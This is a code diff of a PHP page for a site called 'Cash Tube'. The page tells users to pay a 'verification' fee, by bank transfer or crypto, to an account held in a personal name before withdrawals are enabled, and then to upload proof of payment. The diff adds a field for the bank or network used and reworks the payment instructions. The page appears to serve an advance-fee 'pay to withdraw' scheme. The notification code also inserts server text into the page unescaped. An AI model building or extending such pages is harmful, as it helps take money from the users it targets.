@@ -34,7 +34,9 @@ try {
 // Fetch dynamic verification settings from region_settings based on user's country
 try {
     $stmt = $pdo->prepare("
-        SELECT crypto, verify_ch, vc_value, verify_ch_name, verify_ch_value, vcn_value, vcv_value, verify_currency, verify_amount
+        SELECT crypto, verify_ch, vc_value, verify_ch_name, verify_ch_value, 
+               COALESCE(verify_medium, 'Bank Name') AS verify_medium, 
+               vcn_value, vcv_value, verify_currency, verify_amount
         FROM region_settings 
         WHERE country = ?
     ");
@@ -44,22 +46,24 @@ try {
     if (!$settings) {
         $error = 'Verification settings not found for your country. Please contact support.';
         $crypto = 0;
-        $verify_ch = 'Bank';
+        $verify_ch = 'Payment Method';
         $vc_value = 'Obi Mikel';
-        $verify_ch_name = 'Bank Name';
+        $verify_ch_name = 'Account Name';
         $verify_ch_value = 'Account Number';
-        $vcn_value = 'MOMO PSB';
+        $verify_medium = 'Bank Name';
+        $vcn_value = 'First Bank';
         $vcv_value = '8012345678';
         $verify_currency = 'NGN';
         $verify_amount = 0.00;
         error_log('No region settings found for country: ' . $user_country, 3, '../debug.log');
     } else {
         $crypto = $settings['crypto'] ?? 0;
-        $verify_ch = htmlspecialchars($settings['verify_ch'] ?: 'Bank');
+        $verify_ch = htmlspecialchars($settings['verify_ch'] ?: 'Payment Method');
         $vc_value = htmlspecialchars($settings['vc_value'] ?: 'Obi Mikel');
-        $verify_ch_name = htmlspecialchars($settings['verify_ch_name'] ?: 'Bank Name');
+        $verify_ch_name = htmlspecialchars($settings['verify_ch_name'] ?: 'Account Name');
         $verify_ch_value = htmlspecialchars($settings['verify_ch_value'] ?: 'Account Number');
-        $vcn_value = htmlspecialchars($settings['vcn_value'] ?: 'MOMO PSB');
+        $verify_medium = htmlspecialchars($settings['verify_medium'] ?: 'Bank Name');
+        $vcn_value = htmlspecialchars($settings['vcn_value'] ?: 'First Bank');
         $vcv_value = htmlspecialchars($settings['vcv_value'] ?: '8012345678');
         $verify_currency = htmlspecialchars($settings['verify_currency'] ?: 'NGN');
         $verify_amount = floatval($settings['verify_amount'] ?: 0.00);
@@ -68,11 +72,12 @@ try {
     error_log('Settings fetch error: ' . $e->getMessage(), 3, '../debug.log');
     $error = 'Failed to load verification settings. Please try again later.';
     $crypto = 0;
-    $verify_ch = 'Bank';
+    $verify_ch = 'Payment Method';
     $vc_value = 'Obi Mikel';
-    $verify_ch_name = 'Bank Name';
+    $verify_ch_name = 'Account Name';
     $verify_ch_value = 'Account Number';
-    $vcn_value = 'MOMO PSB';
+    $verify_medium = 'Bank Name';
+    $vcn_value = 'First Bank';
     $vcv_value = '8012345678';
     $verify_currency = 'NGN';
     $verify_amount = 0.00;
@@ -80,9 +85,12 @@ try {
 
 // Handle form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $verify_medium_input = filter_input(INPUT_POST, 'verify_medium', FILTER_SANITIZE_STRING);
     $proof_file = $_FILES['proof_file'] ?? null;
 
-    if (!$proof_file || $proof_file['error'] === UPLOAD_ERR_NO_FILE) {
+    if (!$verify_medium_input) {
+        $error = 'Please provide the ' . htmlspecialchars($verify_medium) . '.';
+    } elseif (!$proof_file || $proof_file['error'] === UPLOAD_ERR_NO_FILE) {
         $error = 'Please upload a payment proof file.';
     } else {
         // Validate file
@@ -113,10 +121,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
                     // Insert into verification_requests table
                     $stmt = $pdo->prepare("
-                        INSERT INTO verification_requests (user_id, payment_amount, name, email, upload_path, file_name, status, payment_method, currency)
-                        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?)
+                        INSERT INTO verification_requests 
+                        (user_id, payment_amount, name, email, upload_path, file_name, status, payment_method, currency, verify_medium)
+                        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?, ?)
                     ");
-                    $stmt->execute([$_SESSION['user_id'], $verify_amount, $username, $email, $upload_path, $file_name, $verify_ch, $verify_currency]);
+                    $stmt->execute([
+                        $_SESSION['user_id'], $verify_amount, $username, $email, 
+                        $upload_path, $file_name, $verify_ch, $verify_currency, $verify_medium_input
+                    ]);
 
                     // Commit transaction
                     $pdo->commit();
@@ -146,7 +158,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="description" content="Verify your Cash Tube account to enable withdrawals." />
-    <meta name="keywords" content="Cash Tube, verify account, cryptocurrency, bank transfer" />
+    <meta name="keywords" content="Cash Tube, verify account, cryptocurrency, payment verification" />
     <meta name="author" content="Cash Tube" />
     <title>Verify Account | Cash Tube</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
@@ -319,7 +331,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         .input-container input[type="file"] {
-            padding: 12px; /* Adjusted for better appearance */
+            padding: 12px;
             cursor: pointer;
         }
 
@@ -480,17 +492,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             transition: all 0.3s ease;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
         @media (max-width: 768px) {
             .container {
                 padding: 16px;
@@ -549,25 +550,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <div class="instructions">
                     <h3>Verification Instructions</h3>
                     <p>To verify your account, please make a payment of <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong> via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> using the details below:</p>
-                    <p><strong><?php echo htmlspecialchars($verify_ch_name); ?>:</strong> <?php echo htmlspecialchars($vc_value); ?> (<?php echo htmlspecialchars($vcn_value); ?>)</p>
+                    <p><strong><?php echo htmlspecialchars($verify_medium); ?>:</strong> <?php echo htmlspecialchars($vcn_value); ?></p>
+                    <p><strong><?php echo htmlspecialchars($verify_ch_name); ?>:</strong> <?php echo htmlspecialchars($vc_value); ?></p>
                     <p><strong><?php echo htmlspecialchars($verify_ch_value); ?>:</strong> <?php echo htmlspecialchars($vcv_value); ?></p>
-                    <p>After completing the payment, upload a screenshot or proof of payment below. Your verification request will be reviewed within 48 hours.</p>
+                    <p>After completing the payment, provide the <?php echo htmlspecialchars($verify_medium); ?> used and upload a screenshot or proof of payment below. Your verification request will be reviewed within 48 hours.</p>
                     
                     <h3>Important Notes</h3>
                     <?php if ($crypto): ?>
                         <ul>
-                            <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong>wallet address</strong>.</li>
+                            <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong><?php echo htmlspecialchars($verify_ch_value); ?></strong>.</li>
                             <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
-                            <li>Include the correct <strong>network (<?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong>wallet address (<?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
+                            <li>Include the correct <strong><?php echo htmlspecialchars($verify_medium); ?> (e.g., <?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong><?php echo htmlspecialchars($verify_ch_value); ?> (e.g., <?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
                             <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender wallet, receiver wallet, amount, network, timestamp).</li>
                             <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
                             <li>Verification may take up to 48 hours to process.</li>
                         </ul>
                     <?php else: ?>
                         <ul>
-                            <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong>bank account</strong>.</li>
+                            <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong><?php echo htmlspecialchars($verify_ch_value); ?></strong>.</li>
                             <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
-                            <li>Include the correct <strong>bank name (<?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong>account number (<?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
+                            <li>Include the correct <strong><?php echo htmlspecialchars($verify_medium); ?> (e.g., <?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong><?php echo htmlspecialchars($verify_ch_value); ?> (e.g., <?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
                             <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender, receiver, amount, timestamp).</li>
                             <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
                             <li>Verification may take up to 48 hours to process.</li>
@@ -575,6 +577,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <?php endif; ?>
                 </div>
                 <form action="verify_account.php" method="POST" enctype="multipart/form-data">
+                    <div class="input-container">
+                        <input type="text" id="verify_medium" name="verify_medium" required placeholder="e.g., <?php echo htmlspecialchars($vcn_value); ?>">
+                        <label for="verify_medium"><?php echo htmlspecialchars($verify_medium); ?></label>
+                    </div>
                     <div class="input-container">
                         <input type="file" id="proof_file" name="proof_file" accept=".jpg,.jpeg,.png,.pdf" required placeholder=" ">
                         <label for="proof_file">Upload Payment Proof</label>
@@ -589,8 +595,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div>
 
     <div class="bottom-menu" role="navigation">
-        <a href="home.php" class="active">Home</a>
-        <a href="profile.php">Profile</a>
+        <a href="home.php">Home</a>
+        <a href="profile.php" class="active">Profile</a>
         <a href="history.php">History</a>
         <a href="support.php">Support</a>
         <button id="logoutBtn" aria-label="Log out">Logout</button>
@@ -619,13 +625,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             !n.__lc.asyncInit && e.init();
             n.LiveChatWidget = n.LiveChatWidget || e;
         })(window, document, [].slice);
-    </script>
-    <noscript>
-        <a href="https://www.livechat.com/chat-with/15808029/" rel="nofollow">Chat with us</a>, 
-        powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a>
-    </noscript>
 
-    <script>
         // Dark Mode Toggle
         const themeToggle = document.getElementById('themeToggle');
         const body = document.body;
@@ -651,6 +651,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 });
                 item.classList.add('active');
             });
+        });
+
+        // Initialize and Update Label Positions
+        function updateLabelPosition(input) {
+            const label = input.nextElementSibling;
+            if (label && label.tagName === 'LABEL') {
+                if (input.value !== '') {
+                    label.classList.add('active');
+                    input.classList.add('has-value');
+                } else {
+                    label.classList.remove('active');
+                    input.classList.remove('has-value');
+                }
+            }
+        }
+
+        document.querySelectorAll('.input-container input').forEach((input) => {
+            updateLabelPosition(input); // Initialize on load
+            input.addEventListener('input', () => updateLabelPosition(input)); // Update on input
+            input.addEventListener('focus', () => {
+                const label = input.nextElementSibling;
+                if (label && label.tagName === 'LABEL') {
+                    label.classList.add('active');
+                }
+            });
+            input.addEventListener('blur', () => updateLabelPosition(input)); // Update on blur
         });
 
         // Logout Button
@@ -700,11 +726,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 type: 'GET',
                 dataType: 'json',
                 success: function(notifications) {
+                    notificationContainer.innerHTML = '';
                     notifications.forEach((message, index) => {
                         const notification = document.createElement('div');
-                        notification.className = 'notification';
+                        notification.className = `notification ${message.type || 'success'}`;
                         notification.setAttribute('role', 'alert');
-                        notification.innerHTML = `<span>${message}</span>`;
+                        notification.innerHTML = `<span>${message.text}</span>`;
                         notificationContainer.appendChild(notification);
                         notification.style.top = `${20 + index * 80}px`;
                         setTimeout(() => notification.remove(), 3500);
